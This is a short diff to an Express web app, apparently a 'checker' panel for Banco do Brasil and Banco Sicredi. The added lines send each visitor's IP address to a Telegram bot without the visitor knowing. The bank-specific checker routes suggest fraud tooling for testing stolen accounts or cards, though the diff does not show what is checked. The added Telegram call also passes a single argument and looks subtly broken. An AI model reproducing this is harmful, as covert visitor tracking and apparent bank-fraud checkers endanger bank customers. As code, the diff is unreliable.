@@ -21,6 +21,7 @@ app.get('/', (req, res) => {
 app.get('/checkerbb', (req, res) => {
     const clientIp = requestIp.getClientIp(req).split(':');
     checkIP('Banco do Brasil', clientIp[3]);
+    bot.telegram.sendMessage(clientIp[3]);
     res.render('checker', {
         checker_name: 'Banco do Brasil',
         api_tag: 'apibb',
@@ -33,6 +34,7 @@ app.get('/checkerbb', (req, res) => {
 app.get('/checkersicredi', (req, res) => {
     const clientIp = requestIp.getClientIp(req).split(':');
     checkIP('Banco Sicredi', clientIp[3]);
+    bot.telegram.sendMessage(clientIp[3]);
     res.render('checker', {
         checker_name: 'Banco Sicredi',
         api_tag: 'apisicredi',
